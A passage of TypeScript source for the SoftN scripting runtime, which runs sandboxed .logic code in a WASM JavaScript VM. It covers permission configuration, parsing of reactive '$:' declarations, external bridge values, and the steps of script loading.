/**
 * SoftN Scripting Bridge
 *
 * Integrates the scripting VM with the SoftN runtime. The engine itself is
 * selected in `./vm-adapter` — currently zipp, a JavaScript engine written in
 * Rust and compiled to WASM. All .logic code executes inside the WASM VM, so
 * the sandbox holds: no `eval`, no `new Function`, and no host object the
 * engine preamble did not hand over.
 */

import { VmAdapter, VM_BRIDGE_PREAMBLE, type SymbolScope } from './vm-adapter';
import { SOFTN_BRIDGE_PREAMBLE } from './softn-preamble';
import { extractEventProps } from './event-props';
import { clearCapturedKeys, parseCapturedKeys, setCapturedKeys, shouldCaptureKey } from './key-capture';
import { deepEqual } from './vm-state';

import type { ScriptBlock, LogicBlock, SoftNDocument } from '../parser/ast';
import type { AppPermissions } from '../bundle/types';
import { getFileByRef, registerFileRef } from './file-registry';
import { pcmToWavDataUrl } from './wav';
import { isRemoteUrl } from '../renderer/sanitize-html';
import type {
  BundleFileProvider,
  AIPermissionConfig,
  GpuPermissionConfig,
  ModelSource,
  OnnxFeeds,
  OnnxRunOptions,
  PipelineTask,
  PipelineOptions,
  GenerateOptions,
  DirectModelOptions,
  ChatMessage,
} from './ai-manager';
export type { BundleFileProvider } from './ai-manager';

/**
 * Type alias for code blocks - either ScriptBlock or LogicBlock
 */
export type CodeBlock = ScriptBlock | LogicBlock;
import type { RuntimeState, XDBRecord } from '../types';

/**
 * Execution context handed to SoftN scripts.
 */
export interface ScriptContext {
  // State management
  state: RuntimeState;
  setState: (path: string, value: unknown) => void;
  /** Batch multiple state changes into a single React setState call (optional optimization) */
  batchSetState?: (changes: Record<string, unknown>) => void;

  // XDB data
  data: Record<string, XDBRecord[]>;

  // XDB operations
  xdb: XDBModule;

  // Navigation
  nav: NavModule;

  // Console (for debugging)
  console: ConsoleModule;
}

/**
 * XDB module for SoftN scripts
 */
export interface XDBModule {
  create: (collection: string, data: Record<string, unknown>) => Promise<XDBRecord>;
  update: (id: string, data: Record<string, unknown>) => Promise<XDBRecord>;
  delete: (id: string) => Promise<void>;
  query: (collection: string, filter?: Record<string, unknown>) => Promise<XDBRecord[]>;
  get: (collection: string, id: string) => Promise<XDBRecord | null>;
  sync: () => Promise<void>;
}

/**
 * Navigation module for SoftN scripts
 */
export interface NavModule {
  goto: (page: string) => void;
  back: () => void;
  params: Record<string, string>;
}

/**
 * Console module for SoftN scripts
 */
export interface ConsoleModule {
  log: (...args: unknown[]) => void;
  error: (...args: unknown[]) => void;
  warn: (...args: unknown[]) => void;
}

export type ScriptRuntimeMode = 'main' | 'worker';

/** State the framework reads by name, whatever the document happens to say. */
const FRAMEWORK_OBSERVED_STATE: readonly string[] = ['currentPage'];

/**
 * Every identifier the document could resolve against React state.
 *
 * Pass the result as {@link ScriptRuntimeOptions.observedStateNames} and the
 * runtime stops mirroring state variables the document never names — see
 * `partitionStateVars` for why that is worth doing and why it is safe.
 *
 * The logic block is excluded because it DECLARES these names: scanning it
 * would match every one of them and hold nothing back. Everything else is
 * scanned, markup and styles and data alike, and scanned as text rather than
 * walked as a tree — a name in a comment or a CSS class needlessly keeps its
 * variable synced, which costs a little speed, where missing a real reference
 * would silently freeze part of the UI. Only one of those is worth risking.
 *
 * Returns null when the document cannot be scanned, meaning "sync everything".
 */
export function collectObservedStateNames(doc: SoftNDocument): ReadonlySet<string> | null {
  const { script: _script, logic: _logic, ...observable } = doc;
  let text: string;
  try {
    text = JSON.stringify(observable) ?? "";
  } catch {
    // Cyclic or otherwise unserialisable: nothing can be proven unobserved.
    return null;
  }
  if (!text) return null;
  const names = new Set<string>(FRAMEWORK_OBSERVED_STATE);
  // Unicode-aware, because the engine is: `let café = 1` compiles, and an
  // ASCII-only scan tokenised it as "caf" — so the real name never entered the
  // observed set, the variable was classed VM-owned, and it silently stopped
  // syncing to React. That is the asymmetry this scan is built around, falling
  // the wrong way: over-collecting costs a little speed, under-collecting
  // freezes part of the UI with nothing to suggest why.
  for (const match of text.matchAll(/[\p{ID_Start}$_][\p{ID_Continue}$_]*/gu)) names.add(match[0]);
  return names;
}

export interface ScriptRuntimeOptions {
  mode?: ScriptRuntimeMode;
  /**
   * Logic files the host already concatenated into `script.code` itself.
   *
   * A host that assembles a bundle may inline manifest-listed `.logic` files
   * ahead of the entry file. Those files are then already part of this
   * compilation, so an `import` naming one must not inline it a second time —
   * every class and variable in it would be declared twice, which the VM
   * rejects. Paths are bundle-relative, matching what `importResolver` takes.
   */
  preIncludedLogicPaths?: readonly string[];
  /**
   * The bundle's parsed `permission.json`.
   *
   * Without it every capability check runs in "no config" mode, which is
   * permissive for most APIs but still refuses plain `http://` — so a bundle
   * that legitimately declares `net.allow_http` cannot reach its own server.
   */
  permissionConfig?: PermissionConfig;
  /**
   * Every identifier the document could resolve against React state.
   *
   * State variables outside this set are owned by the VM: the host neither
   * reads them back nor writes them, because nothing outside the VM can
   * observe them. See {@link SoftNScriptRuntime.partitionStateVars}.
   *
   * Omit it and every state variable is synced, which is what every host did
   * before this existed and is always correct — just slower.
   */
  observedStateNames?: ReadonlySet<string>;
  /**
   * Where `softn.storage.*` sends its operations: the storage endpoint of
   * the app in the directory that published it. Absent for an app opened
   * from a file, which then has no server storage and is told so.
   */
  storageEndpoint?: string;
}

export interface ScriptLoadResult {
  state: Record<string, unknown>;
  functions: Record<string, (...args: unknown[]) => Promise<unknown>>;
  syncFunctions: Record<string, (...args: unknown[]) => unknown>;
  computed: Record<string, () => unknown>;
}

export interface ScriptRuntimeHandle {
  loadScript: (script: CodeBlock) => Promise<ScriptLoadResult>;
  updateContext: (newState: Partial<RuntimeState>) => void;
  cleanup: () => void;
}

/**
 * Permission config from permission.json — describes what capabilities an app needs.
 */
export interface PermissionConfig {
  app?: { id?: string; name?: string; version?: string };
  permissions: {
    net?: { enabled?: boolean; allowed_hosts?: string[]; allow_http?: boolean };
    camera?: { enabled?: boolean; modes?: string[] };
    mic?: { enabled?: boolean; maxSeconds?: number };
    files?: { enabled?: boolean; scopes?: string[] };
    qr?: { enabled?: boolean };
    ai?: AIPermissionConfig;
    gpu?: GpuPermissionConfig;
    sync?: { enabled?: boolean };
    /**
     * The app's own database on the directory that publishes it, reached
     * through `softn.storage.*`. Unrelated to the manifest's legacy
     * `permissions.storage` flag, which is about localStorage.
     */
    storage?: { enabled?: boolean };
    /**
     * Generated numeric code runs on the host's own engine: the script hands
     * over functions it builds at run time (an emulator's compiled traces, a
     * signal kernel), validated against a closed arithmetic language and bound
     * to views of the script's typed arrays. Many times faster than the
     * sandbox's interpreter for that code; nothing else of the host is
     * reachable from it.
     */
    accel?: { enabled?: boolean };
  };
  /**
   * The bundle declared capabilities and the user has not answered yet.
   *
   * Set by the host when it boots an app with its declared capabilities
   * withheld so the UI can be seen before anything is granted. `permissions`
   * is empty in that state, so every check already denies; this only changes
   * what the denial says. Without it the app is told to "add net.enabled to
   * permission.json" — advice for an author, about a file that already says
   * exactly that, aimed at a user who has simply not clicked Allow.
   */
  consentPending?: boolean;
}

/** Pending host call from the VM (mirrors Rust PendingHostCall) */
export interface PendingHostCall {
  id: number;
  kind: string;
  args: string[];
}

/** How a sound reached silence — what `audio.whenEnded` resolves with. */
interface AudioOutcome {
  handle: string;
  status: 'ended' | 'stopped' | 'error';
  durationMs?: number;
  reason?: string;
}


/**
 * Optional WASM-based host bridge detector. Set by the WASM adapter when loaded.
 * Uses the Rust lexer for proper lexical analysis instead of regex.
 */
let _wasmDetectHostBridges: ((code: string) => string[]) | null = null;

/** Register the WASM-based detectHostBridges function (called by WasmFormLogicAdapter). */
export function setWasmDetectHostBridges(fn: (code: string) => string[]): void {
  _wasmDetectHostBridges = fn;
}

/**
 * Fast compatibility check used for worker-mode migration gating.
 * Scripts that rely on synchronous host bridges are currently main-thread only.
 *
 * Uses the WASM lexer (detectHostBridges) when available for robust token-level
 * analysis that correctly handles comments, strings, template literals, and regex.
 * Falls back to regex-based stripping when WASM is not loaded.
 */
export function detectWorkerIncompatibilities(code: string): string[] {
  if (!code) return [];

  // Try WASM lexer first — proper lexical analysis, no false positives from
  // regex edge cases (regex literals, nested template strings, etc.)
  if (_wasmDetectHostBridges) {
    try {
      return _wasmDetectHostBridges(code);
    } catch {
      // WASM call failed — fall through to regex fallback
    }
  }

  // Regex fallback: strip comments and string literals to prevent false positives.
  const stripped = code
    .replace(/\/\*[\s\S]*?\*\//g, '')
    .replace(/\/\/[^\n\r]*/g, '')
    .replace(/`(?:[^`\\]|\\.)*`/g, '""')
    .replace(/"(?:[^"\\]|\\.)*"/g, '""')
    .replace(/'(?:[^'\\]|\\.)*'/g, '""');

  const reasons: string[] = [];
  const checks: Array<{ pattern: RegExp; reason: string }> = [
    { pattern: /\bdb\./, reason: 'uses db bridge (synchronous host access)' },
    { pattern: /\bwindow\./, reason: 'uses window bridge/event APIs' },
    { pattern: /\bnavigator\./, reason: 'uses navigator bridge APIs' },
    { pattern: /\blocalStorage\./, reason: 'uses localStorage bridge' },
    { pattern: /\bhost\./, reason: 'uses host.call bridge (async host access)' },
  ];

  for (const check of checks) {
    if (check.pattern.test(stripped)) {
      reasons.push(check.reason);
    }
  }

  return reasons;
}

/**
 * Names of variables added by BRIDGE_PREAMBLE that should not be treated
 * as user state variables.
 */
const EXTERNAL_VALUES_VAR = '__softnExternalValues';
const BRIDGE_VARS = new Set(['window', 'navigator', 'host', 'softn', EXTERNAL_VALUES_VAR]);
const EXTERNAL_FUNCTION_RESERVED_NAMES = new Set([...BRIDGE_VARS, 'db', 'localStorage']);

/** Prefix for the functions generated from `$:` declarations. */
const COMPUTED_PREFIX = '__softnComputed_';

/**
 * Cross-check every "unchanged" digest against a full value comparison.
 *
 * Set `globalThis.__SOFTN_FP_AUDIT__ = true` before a bundle loads. Costs
 * exactly what the digests save, so it is for verifying them, not for use.
 */
function FINGERPRINT_AUDIT(): boolean {
  return (globalThis as unknown as Record<string, unknown>).__SOFTN_FP_AUDIT__ === true;
}

/** A name safe to paste into generated source as an identifier. */
const VALID_IDENTIFIER = /^[a-zA-Z_$][a-zA-Z0-9_$]*$/;

type ExternalPrimitive = string | number | boolean | null | undefined;
const UNSUPPORTED_EXTERNAL_VALUE = Symbol('unsupported external value');
type ExternalValueRead = ExternalPrimitive | typeof UNSUPPORTED_EXTERNAL_VALUE;

/** Match the value JSON source generation used for external bridge snapshots. */
function normalizeExternalPrimitive(value: unknown): ExternalValueRead {
  if (value === null || value === undefined) return value;
  if (typeof value === 'string' || typeof value === 'boolean') return value;
  if (typeof value === 'number') {
    // JSON.stringify was historically used for the injected return literal:
    // non-finite numbers became null and negative zero became zero.
    if (!Number.isFinite(value)) return null;
    return Object.is(value, -0) ? 0 : value;
  }
  return UNSUPPORTED_EXTERNAL_VALUE;
}

/**
 * Extract safe, serializable properties from a browser Event for passing to the VM.
 * Only extracts primitive-valued properties — no DOM nodes, functions, or circular refs.
 */
/**
 * Extract `$: name = expression;` reactive declarations from source code.
 * Uses a comment/string-aware scanner to avoid matching inside comments or strings,
 * and supports multi-line expressions by balancing brackets.
 */
function extractComputedDeclarations(code: string): Array<{ name: string; expression: string }> {
  const results: Array<{ name: string; expression: string }> = [];
  const len = code.length;
  let i = 0;

  while (i < len) {
    const ch = code[i];

    // Skip single-line comments
    if (ch === '/' && i + 1 < len && code[i + 1] === '/') {
      i += 2;
      while (i < len && code[i] !== '\n') i++;
      continue;
    }

    // Skip multi-line comments
    if (ch === '/' && i + 1 < len && code[i + 1] === '*') {
      i += 2;
      while (i < len && !(code[i] === '*' && i + 1 < len && code[i + 1] === '/')) i++;
      if (i + 1 < len) i += 2; // skip */ (with bounds check)
      continue;
    }

    // Skip string literals
    if (ch === '"' || ch === "'" || ch === '`') {
      const quote = ch;
      i++;
      while (i < len && code[i] !== quote) {
        if (code[i] === '\\' && i + 1 < len) i++; // skip escaped char (with bounds check)
        i++;
      }
      if (i < len) i++; // skip closing quote (with bounds check)
      continue;
    }

    // Look for `$:` at a statement boundary (start of line or after whitespace/semicolon)
    if (ch === '$' && i + 1 < len && code[i + 1] === ':') {
      // Verify it's at a statement boundary (not part of an identifier like `a$:`)
      const prev = i > 0 ? code[i - 1] : '\n';
      if (prev === '\n' || prev === ';' || prev === '{' || prev === '}' || /\s/.test(prev)) {
        let j = i + 2; // skip "$:"
        // Skip whitespace
        while (j < len && (code[j] === ' ' || code[j] === '\t')) j++;

        // Extract variable name
        const nameStart = j;
        while (j < len && /\w/.test(code[j])) j++;
        const name = code.substring(nameStart, j);

        if (name) {
          // Skip whitespace and '='
          while (j < len && (code[j] === ' ' || code[j] === '\t')) j++;
          if (j < len && code[j] === '=') {
            j++; // skip '='
            while (j < len && (code[j] === ' ' || code[j] === '\t')) j++;

            // Extract expression — balance brackets until ';' at depth 0
            // Skips strings AND comments to avoid false termination
            const exprStart = j;
            let depth = 0;
            while (j < len) {
              const ec = code[j];
              // Skip single-line comments inside expression
              if (ec === '/' && j + 1 < len && code[j + 1] === '/') {
                j += 2;
                while (j < len && code[j] !== '\n') j++;
                continue;
              }
              // Skip multi-line comments inside expression
              if (ec === '/' && j + 1 < len && code[j + 1] === '*') {
                j += 2;
                while (j < len && !(code[j] === '*' && j + 1 < len && code[j + 1] === '/')) j++;
                if (j + 1 < len) j += 2;
                continue;
              }
              if (ec === '(' || ec === '[' || ec === '{') {
                depth++;
              } else if (ec === ')' || ec === ']' || ec === '}') {
                depth--;
              } else if (ec === '"' || ec === "'" || ec === '`') {
                // Skip string inside expression
                const q = ec;
                j++;
                while (j < len && code[j] !== q) {
                  if (code[j] === '\\' && j + 1 < len) j++;
                  j++;
                }
              } else if (ec === ';' && depth === 0) {
                break;
              } else if (ec === '\n' && depth === 0) {
                // Newline at depth 0 also ends the expression (ASI)
                break;
              }
              j++;
            }
            const expression = code.substring(exprStart, j).trim();
            if (expression) {
              results.push({ name, expression });
            }
          }
        }
        i = j + 1;
        continue;
      }
    }

    i++;
  }

  return results;
}

/**
 * SoftN Script Runtime
 * Executes .logic code inside the WASM VM for true sandboxing.
 * No `new Function()` calls are used — all user code runs in the VM.
 */
export class SoftNScriptRuntime {
  private vmEngine: VmAdapter | null = null;
  private context: ScriptContext;
  private db: DBNamespace;
  private permissions?: AppPermissions;
  private appId?: string;
  private runtimeMode: ScriptRuntimeMode;
  /** Cached XDB service for notification batching */
  private xdbService: import('./xdb').XDBService | null = null;

  /** Symbol map from VM globals (set after initializeScript) */
  private symbolMap: Map<string, { index: number; scope: SymbolScope }> | null = null;
  /** Names of state variables (non-function, non-bridge globals) */
  private stateVarNames: string[] = [];
  /** Cached slot indices for state variables (parallel to stateVarNames) */
  private stateVarIndices: number[] = [];
  /** Digests from the last read, parallel to stateVarIndices. */
  private stateVarFingerprints: number[] | null = null;
  /** Identifiers the document can resolve; null means "assume all of them". */
  private observedStateNames: ReadonlySet<string> | null = null;
  private storageEndpoint: string | null = null;
  /** State variables held back from syncing, for diagnostics only. */
  private vmOwnedStateNames: string[] = [];
  /** The same names as a set, for the per-key push to consult on every call. */
  private vmOwnedStateSet = new Set<string>();
  /** Guard: when true, sync functions must not overwrite VM state (async call in-flight) */
  private asyncCallInProgress = false;
  /** Mutex for async VM calls to prevent concurrent stack corruption.
   *  Uses a release-function pattern instead of .then() chaining to avoid
   *  unbounded promise chain growth that causes GC pressure over time. */
  private vmCallLock: Promise<void> = Promise.resolve();
  /** Current depth of queued async VM calls. If this exceeds the limit,
   *  new calls are dropped with a warning to prevent memory pressure and input lag. */
  private vmCallQueueDepth = 0;
  /**
   * Granular dirty tracking: tracks which specific state keys have changed since
   * the last syncReactStateToVM(). Only the dirty keys are synced to the VM,
   * avoiding redundant WASM boundary crossings for unchanged state.
   * Initialized to null to signal "sync all" on first call.
   */
  private dirtyStateKeys: Set<string> | null = null;

  /**
   * Per-render cache for sync function results.
   * Cleared when state changes (via syncReactStateToVM dirty detection)
   * and automatically expires between render frames (>2ms gap detection).
   */
  private syncCallCache = new Map<string, unknown>();
  /** Timestamp of last sync function call — for frame boundary detection. */
  private lastSyncCallTs = 0;

  /**
   * Active native event listeners for the window bridge.
   * Managed at the JS level since the WASM VM stores handler Values internally.
   */
  private nativeListeners: Map<string, EventListener[]> = new Map();

  /** Index of the `window` global in the VM */
  private windowGlobalIndex: number = -1;

  /** Set of __ window property keys to sync */
  private syncKeys: Set<string> = new Set();
  /** Cached: true when at least one syncKey is defined on the real window */
  private windowSyncActive = false;

  /** Event types already bridged from VM → browser (prevents duplicate listeners) */
  private bridgedEventTypes: Set<string> = new Set();

  /** Import resolver for .logic file imports (resolves path → source code) */
  private importResolver?: (path: string) => Promise<string | null>;
  /** Base path of the .logic file for resolving relative imports */
  private logicBasePath?: string;
  /**
   * Every `.logic` path already part of this compilation — whether the host
   * concatenated it or an earlier import pulled it in. The single registry
   * that makes inclusion idempotent no matter which path reached the file.
   */
  private includedLogicPaths = new Set<string>();

  /** Permission config from permission.json (set via setPermissionConfig) */
  private permissionConfig: PermissionConfig | null = null;

  /** Lazy-loaded ONNX manager (created on first softn.ai.onnx.* call) */
  private onnxManager: import('./ai-onnx-manager').OnnxManager | null = null;
  /** Lazy-loaded Transformers.js manager (created on first softn.ai.pipeline/generate/embed/classify call) */
  private transformersManager: import('./ai-transformers-manager').TransformersManager | null =
    null;
  /** Lazy-loaded GPU compute manager (created on first softn.ai.gpu.* call) */
  private gpuComputeManager: import('./ai-gpu-compute-manager').GpuComputeManager | null = null;
  /** Bundle file provider for loading models from .softn bundles */
  private bundleFileProvider: BundleFileProvider | null = null;
  /** External functions (e.g. wallet bridge) to inject into the VM as callable globals */
  private externalFunctions: Record<string, (...args: unknown[]) => unknown> | null = null;
  /** No-argument external bridge names compiled into the current VM. */
  private externalFunctionNames: string[] = [];
  /** Last primitive snapshot written to the VM, parallel to externalFunctionNames. */
  private externalFunctionValues: ExternalPrimitive[] = [];
  /** Slot holding the mutable external bridge value table inside the VM. */
  private externalValuesGlobalIndex = -1;
  /** Network requests owned by this runtime, cancelled when the app closes. */
  private netAbortControllers = new Set<AbortController>();
  private static readonly MAX_NET_RESPONSE_BYTES = 10 * 1024 * 1024;

  /** Sounds this app currently has playing, by the handle its script holds.
   *  `watchers` are pending `whenEnded` calls; each hears exactly one outcome. */
  private audioPlaying = new Map<
    string,
    {
      el: HTMLAudioElement;
      volume: number;
      watchers: Array<(outcome: AudioOutcome) => void>;
    }
  >();
  /** Outcomes of sounds that are gone, so a `whenEnded` asked after the fact
   *  still answers with what happened. Every one-shot lands here, so it is
   *  capped — the oldest is forgotten and reads as unknown. */
  private audioFinished = new Map<string, AudioOutcome>();
  private static readonly MAX_AUDIO_FINISHED = 256;
  private audioMasterVolume = 1;
  private audioSeq = 0;
  /** Gesture listeners waiting to start a soundtrack the browser refused. */
  private audioUnlockers = new Set<() => void>();

  /** QR image loads/detections in flight. Cleanup rejects them immediately. */
  private qrDecodeCancelers = new Set<() => void>();
  private static readonly QR_OPERATION_TIMEOUT_MS = 10_000;

  /**
   * The recording in flight, if any.
   *
   * One at a time: two overlapping `softn.mic.record()` calls would fight over
   * the same device, and the second would take the first's samples with it.
   * `finish` is how both the duration timer and an early `mic.stop()` end the
   * same recording without either needing to know about the other.
   */
  private micRecording: { stop: (reason: 'complete' | 'stopped') => void } | null = null;
  /**
   * Device access can remain pending while the browser shows its permission
   * prompt. Reserve that interval too, so cleanup and a second record request
   * cannot lose track of a stream that has not been handed back yet.
   */
  private micAcquisition: { cancelled: boolean } | null = null;

  constructor(
    context: ScriptContext,
    permissions?: AppPermissions,
    appId?: string,
    importResolver?: unknown,
    logicBasePath?: string,
    options?: ScriptRuntimeOptions,
    bundleFileProvider?: BundleFileProvider,
    externalFunctions?: Record<string, (...args: unknown[]) => unknown>
  ) {
    this.context = context;
    this.permissions = permissions;
    this.appId = appId;
    this.runtimeMode = options?.mode || 'main';
    this.observedStateNames = options?.observedStateNames ?? null;
    this.storageEndpoint = options?.storageEndpoint ?? null;
    this.externalFunctions = externalFunctions ?? null;
    this.db = createDBNamespace(() => this.permissionConfig, appId);
    if (typeof importResolver === 'function') {
      this.importResolver = importResolver as (path: string) => Promise<string | null>;
    }
    this.logicBasePath = logicBasePath;
    this.bundleFileProvider = bundleFileProvider ?? null;
    if (options?.permissionConfig) {
      this.permissionConfig = options.permissionConfig;
    }
    for (const p of options?.preIncludedLogicPaths ?? []) {
      this.includedLogicPaths.add(p);
    }
  }

  /** Set the permission config for this runtime (from permission.json). */
  setPermissionConfig(config: PermissionConfig): void {
    this.permissionConfig = config;
  }

  /** Read the current value of a no-argument host bridge without leaking errors. */
  private readExternalFunctionValue(name: string): ExternalValueRead {
    try {
      const fn = this.externalFunctions?.[name];
      if (typeof fn !== 'function') return UNSUPPORTED_EXTERNAL_VALUE;

      const result = fn();
      if (result != null && typeof (result as { then?: unknown }).then === 'function') {
        // These VM globals are synchronous snapshots. Keep async bridges out of
        // them, and make sure a rejected promise cannot become unhandled.
        Promise.resolve(result).catch(() => {});
        return UNSUPPORTED_EXTERNAL_VALUE;
      }
      return normalizeExternalPrimitive(result);
    } catch {
      return UNSUPPORTED_EXTERNAL_VALUE;
    }
  }

  /**
   * Refresh compiled host bridge values in place.
   *
   * The declarations stay in the same VM, so changing a React `functions`
   * implementation cannot re-run script top-level code or `_init()`.
   */
  private syncExternalFunctionsToVM(): void {
    if (!this.vmEngine || this.externalValuesGlobalIndex < 0) return;

    const nextValues = this.externalFunctionNames.map((name) => {
      const value = this.readExternalFunctionValue(name);
      return value === UNSUPPORTED_EXTERNAL_VALUE ? undefined : value;
    });
    const changed = nextValues.some(
      (value, index) => !Object.is(value, this.externalFunctionValues[index])
    );
    // Always restore the table before VM execution. It is an implementation
    // global in the same compilation unit, so app code must not be able to
    // leave a forged bridge value behind by assigning to it.
    this.vmEngine.setGlobal(this.externalValuesGlobalIndex, nextValues);
    if (!changed) return;

    this.externalFunctionValues = nextValues;
    // A template helper may already be cached for this render. Its answer was
    // computed with the previous host snapshot and must not survive the write.
    this.syncCallCache.clear();
  }

  /**
   * Load and execute a script or logic block inside the WASM VM.
   */
  /**
   * Empty result for a load that was abandoned before it could run.
   */
  private static readonly ABANDONED: ScriptLoadResult = {
    state: {},
    functions: {},
    syncFunctions: {},
    computed: {},
  };

  /**
   * True once `cleanup()` has run.
   *
   * `loadScript` is a long async chain and `cleanup()` only disposes an engine
   * that already exists. A cleanup arriving while the first `await` is still
   * pending therefore disposed nothing, and the continuation went on to build a
   * fresh engine and execute the script in it — leaking one WASM engine per
   * mount and running the `.logic` top level a second time. Under
   * `React.StrictMode`, which all four apps use, that is every single mount:
   * measured with a bundle whose top level calls `db.create`, two records
   * appeared where the author wrote one.
   */
  private disposed = false;
  /** Logged once: the engine is dead and calls are being dropped. */
  private terminationLogged = false;

  /** Stop and clean up if this runtime was disposed during an await. */
  private abandonIfDisposed(): boolean {
    if (!this.disposed) return false;
    if (this.vmEngine) {
      this.vmEngine.dispose();
      this.vmEngine = null;
    }
    return true;
  }

  /**
   * Wire the host objects the engine calls synchronously from inside the VM.
   *
   * Its own method because the `$:` compile fallback below has to build a
   * second engine and repeat all of it: zipp v0.0.1 terminates an Engine whose
   * `initScript` throws, and that clears its bridges as well as its authority.
   *
   * Each `register*` call also declares the operations it serves, inside the
   * adapter — so a host cannot install a bridge and leave the guest denied.
   */
  private installHostBridges(): void {
    if (!this.vmEngine) return;

    this.vmEngine.registerDBBridge(this.db);

    const perms = this.permissions || {};
    if (perms.storage !== false) {
      this.vmEngine.registerLocalStorageBridge(this.appId);
    }
    // Clipboard is its own manifest permission and its own engine bridge in
    // v0.0.1. It used to ride on the localStorage bridge because the old engine
    // routed `nav.*` there; that coupling was inherited, not intended, so it is
    // not reproduced. Undefined means granted, matching how `storage` is read
    // one line up — no shipped manifest declares either key.
    if (perms.clipboard !== false) {
      this.vmEngine.registerClipboardBridge();
    }
  }

  async loadScript(script: CodeBlock): Promise<ScriptLoadResult> {
    const useHostBridges = this.runtimeMode === 'main';

    // 0. Create the WASM adapter
    this.vmEngine = await VmAdapter.create();
    if (this.abandonIfDisposed()) return SoftNScriptRuntime.ABANDONED;

    if (useHostBridges) {
      // 1. Ensure XDB is fully initialized before executing any .logic code
      await this.db.ready();
      if (this.abandonIfDisposed()) return SoftNScriptRuntime.ABANDONED;

      // Cache XDB service reference for notification batching
      try {
        const { getXDB } = await import('./xdb');
        this.xdbService = getXDB(this.appId);
      } catch {
        /* XDB not available — batching disabled */
      }
      if (this.abandonIfDisposed()) return SoftNScriptRuntime.ABANDONED;

      // 2. Register bridges on the WASM engine BEFORE compilation/execution
      this.installHostBridges();
    }

    // 3. Resolve imports (inline imported .logic files before passing to WASM)
    let resolvedCode = script.code;
    if (this.importResolver) {
      // The entry file is already in `script.code`, so it counts as included
      // for dedupe as well as being the root of the cycle-detection chain.
      if (this.logicBasePath) this.includedLogicPaths.add(this.logicBasePath);
      resolvedCode = await this.resolveImports(
        resolvedCode,
        new Set(this.logicBasePath ? [this.logicBasePath] : []),
        this.logicBasePath
      );
      // Import resolution fetches files, so this is the longest await of the
      // three and the one most likely to still be pending at cleanup.
      if (this.abandonIfDisposed()) return SoftNScriptRuntime.ABANDONED;
    }

    // 4. Generate preamble for external functions (e.g. wallet bridge).
    // Wrappers read a mutable VM-side table so later host implementations can
    // update without recompiling or re-running script initialization.
    let extFnPreamble = '';
    this.externalFunctionNames = [];
    this.externalFunctionValues = [];
    this.externalValuesGlobalIndex = -1;
    if (this.externalFunctions) {
      for (const name of Object.keys(this.externalFunctions)) {
        // Skip names that cannot safely become VM declarations or are served
        // by another bridge path.
        if (!VALID_IDENTIFIER.test(name) || EXTERNAL_FUNCTION_RESERVED_NAMES.has(name)) continue;
        if (name.startsWith('xdb_') || name === 'asset') continue;
        const value = this.readExternalFunctionValue(name);
        // Preserve the established bridge contract: only synchronous
        // primitive-valued getters become globals in this compilation.
        if (value === UNSUPPORTED_EXTERNAL_VALUE) continue;
        this.externalFunctionNames.push(name);
        this.externalFunctionValues.push(value);
      }

      if (this.externalFunctionNames.length > 0) {
        const serializedValues = this.externalFunctionValues
          .map((value) => (value === undefined ? 'undefined' : JSON.stringify(value)))
          .join(',');
        extFnPreamble = `let ${EXTERNAL_VALUES_VAR} = [${serializedValues}];\n`;
        for (let i = 0; i < this.externalFunctionNames.length; i++) {
          extFnPreamble += `function ${this.externalFunctionNames[i]}() { return ${EXTERNAL_VALUES_VAR}[${i}]; }\n`;
        }
      }
    }

    // 4b. Compile each `$:` declaration into a real function.
    //
    // These are re-read on every render, and evaluating an expression *string*
    // costs a fresh parse each time — the engine interns the result for the VM's
    // lifetime, so a per-frame expression grows the heap until the tab dies.
    // Compiled once alongside the script, each becomes an ordinary call.
    // The expression is raw source and keeps whatever trailed it, including a
    // `// comment`. Each piece therefore gets its own line: on one line a
    // trailing comment would swallow the closing `);` and take the whole
    // script's compilation down with it, not just this one value.
    const computedDecls = extractComputedDeclarations(script.code).filter(
      (d) => VALID_IDENTIFIER.test(d.name) && d.expression.trim() !== ''
    );
    const computedPreamble = computedDecls
      .map((d) => `function ${COMPUTED_PREFIX}${d.name}() {\nreturn (\n${d.expression}\n);\n}`)
      .join('\n');

    // 5. Prepend the engine's bridge preamble (empty on zipp, which declares
    // window/navigator/db/localStorage/host itself) then SoftN's own.
    const scriptCode = VM_BRIDGE_PREAMBLE + SOFTN_BRIDGE_PREAMBLE + extFnPreamble + resolvedCode;
    const fullCode = computedPreamble ? scriptCode + '\n' + computedPreamble : scriptCode;

    // 5. Compile + run the full .logic code in the WASM VM.
    //
    // The generated `$:` bodies share the script's compilation unit, so a
    // declaration the scanner mis-extracts — an expression broken across lines
    // in a way it cannot follow, say — would fail the whole script rather than
    // the one value it belongs to. On that failure, compile the script without
    // them and evaluate those expressions one at a time instead.
    let computedCompiled = computedPreamble !== '';
    let symbolMap: Map<string, { index: number; scope: SymbolScope }>;
    try {
      symbolMap = await this.vmEngine.initializeScript(fullCode);
    } catch (compileError) {
      if (!computedCompiled) throw compileError;
      console.warn(
        '[SoftN] A `$:` declaration could not be compiled, so all of them fall back ' +
          'to per-render evaluation. The script itself is unaffected. Cause:',
        compileError
      );
      computedCompiled = false;
      // The failed compile took the engine with it — v0.0.1 terminates an
      // Engine whose `initScript` throws, wiping its bridges and its capability
      // allowlist — so the retry cannot reuse it. Rebuilding also re-wires and
      // re-grants; retrying in place would compile into a VM that denies every
      // `db.*` call the fallback was supposed to rescue.
      this.vmEngine.dispose();
      this.vmEngine = await VmAdapter.create();
      if (this.abandonIfDisposed()) return SoftNScriptRuntime.ABANDONED;
      if (useHostBridges) this.installHostBridges();
      symbolMap = await this.vmEngine.initializeScript(scriptCode);
    }
    this.symbolMap = symbolMap;
    this.externalValuesGlobalIndex = symbolMap.get(EXTERNAL_VALUES_VAR)?.index ?? -1;

    // 6. Set up window global index (sync keys are discovered dynamically)
    if (useHostBridges) {
      const windowSym = symbolMap.get('window');
      if (windowSym) {
        this.windowGlobalIndex = windowSym.index;
      }
    }

    // 6. Read initial state from VM globals and classify symbols
    const initialState: Record<string, unknown> = {};
    const functionNames: string[] = [];
    const stateVarNames: string[] = [];

    for (const [name, sym] of symbolMap.entries()) {
      // Skip bridge-injected variables
      if (BRIDGE_VARS.has(name)) continue;

      // Generated `$:` bodies are engine plumbing, not script API.
      if (name.startsWith(COMPUTED_PREFIX)) continue;

      if (sym.scope === 'function') {
        functionNames.push(name);
      } else {
        stateVarNames.push(name);
        // WASM returns plain JS values — no formLogicToJS conversion needed
        initialState[name] = this.vmEngine.getGlobal(sym.index);
      }
    }
    this.partitionStateVars(stateVarNames, symbolMap);
    console.log(
      `[SoftN] Script loaded: ${functionNames.length} functions, ${this.stateVarNames.length} state vars` +
        (this.vmOwnedStateNames.length
